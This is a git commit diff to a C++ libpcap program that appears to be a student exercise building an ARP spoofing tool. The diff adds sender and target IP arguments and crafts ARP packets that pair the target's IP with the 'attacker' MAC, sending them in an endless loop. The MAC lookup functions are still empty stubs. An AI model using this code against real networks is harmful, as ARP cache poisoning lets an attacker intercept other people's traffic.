0ec210bbe0021483ca13e7c6e14eec122866a311
alertjjm <sdr2936@gmail.com>
2020-07-29 15:05:37 +0900

    Skeleton completed

--- main.cpp
+++ main.cpp
@@ -12,17 +12,27 @@ struct EthArpPacket {
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax: send-arp-test <interface>\n");
-	printf("sample: send-arp-test wlan0\n");
+	printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
+	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
+}
+
+Mac getmymac(){
+
+}
+
+Mac getsendermac(Ip sip){
+
 }
 
 int main(int argc, char* argv[]) {
-	if (argc != 2) {
+	if (argc != 4) {
 		usage();
 		return -1;
 	}
 
 	char* dev = argv[1];
+	Ip senderip=Ip(argv[2]);
+	Ip targetip=Ip(argv[3]);
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == nullptr) {
@@ -31,9 +41,10 @@ int main(int argc, char* argv[]) {
 	}
 
 	EthArpPacket packet;
-
-	packet.eth_.dmac_ = Mac("d6:25:8b:7e:77:c3");
-	packet.eth_.smac_ = Mac("00:0c:29:6f:81:00");
+	Mac smac=getsendermac(senderip);
+	Mac mmac=getmymac();
+	packet.eth_.dmac_ = smac;//mac of sender
+	packet.eth_.smac_ = mmac;//mac of mine(attacker)
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -41,16 +52,17 @@ int main(int argc, char* argv[]) {
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac("00:0c:29:6f:81:00");
-	packet.arp_.sip_ = htonl(Ip("192.168.43.1"));
-	packet.arp_.tmac_ = Mac("d6:25:8b:7e:77:c3");
-	packet.arp_.tip_ = htonl(Ip("192.168.43.140"));
+	packet.arp_.smac_ = mmac;//mac of mine(attacker)
+	packet.arp_.sip_ = htonl(targetip);//ip of target
+	packet.arp_.tmac_ = smac;//mac of sender
+	packet.arp_.tip_ = htonl(senderip);//ip of sender
 	while(1){
 		printf(".\n");
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
+		sleep(1);
 	}
 	pcap_close(handle);
 }
